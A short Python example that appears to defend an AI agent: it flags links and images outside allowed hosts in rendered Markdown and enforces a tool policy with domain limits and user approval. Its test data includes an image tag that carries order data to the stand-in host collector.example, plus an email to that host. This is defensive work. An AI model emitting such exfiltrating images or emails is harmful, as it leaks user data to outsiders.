from html.parser import HTMLParser
from urllib.parse import urlsplit

ALLOWED_HOSTS = {"cdn.myshop.example", "docs.myshop.example"}

class UrlCheck(HTMLParser):
    """Run on the HTML the Markdown renderer produced, so every link and
    image is caught, whatever Markdown syntax created it."""
    def __init__(self):
        super().__init__(); self.blocked = []
    def handle_starttag(self, tag, attrs):
        for name, value in attrs:
            if name in ("src", "href") and value:
                if urlsplit(value).hostname not in ALLOWED_HOSTS:
                    self.blocked.append((tag, value))

rendered = ('<p>See <a href="https://docs.myshop.example/returns">returns</a>.</p>'
            '<img src="https://collector.example/p.png?d=order-1042-AB12">')
c = UrlCheck(); c.feed(rendered)
print(c.blocked)       # drop or neutralise these before the browser sees them

# Enforced by ordinary code around the agent, never by the prompt.
POLICY = {
    "search_docs":  {"side_effect": False},
    "read_email":   {"side_effect": False},
    "send_email":   {"side_effect": True, "allowed_domains": {"myco.example"}},
    # delete_email is not listed: the agent is never offered it
}

def authorize(tool, args, approved_by_user=False):
    rule = POLICY.get(tool)
    if rule is None:
        return "deny: tool not offered"
    if tool == "send_email":
        domain = args["to"].rsplit("@", 1)[-1]
        if domain not in rule["allowed_domains"]:
            return "deny: recipient outside allowed domains"
    if rule["side_effect"] and not approved_by_user:
        return "ask: show the user the full call and wait"
    return "allow"

calls = [("search_docs", {"q": "refund policy"}, False),
         ("delete_email", {"id": 7}, False),
         ("send_email", {"to": "x@collector.example"}, True),
         ("send_email", {"to": "ana@myco.example"}, False),
         ("send_email", {"to": "ana@myco.example"}, True)]
for tool, args, ok in calls:
    print(f"{tool:12} {str(args):34} {authorize(tool, args, ok)}")

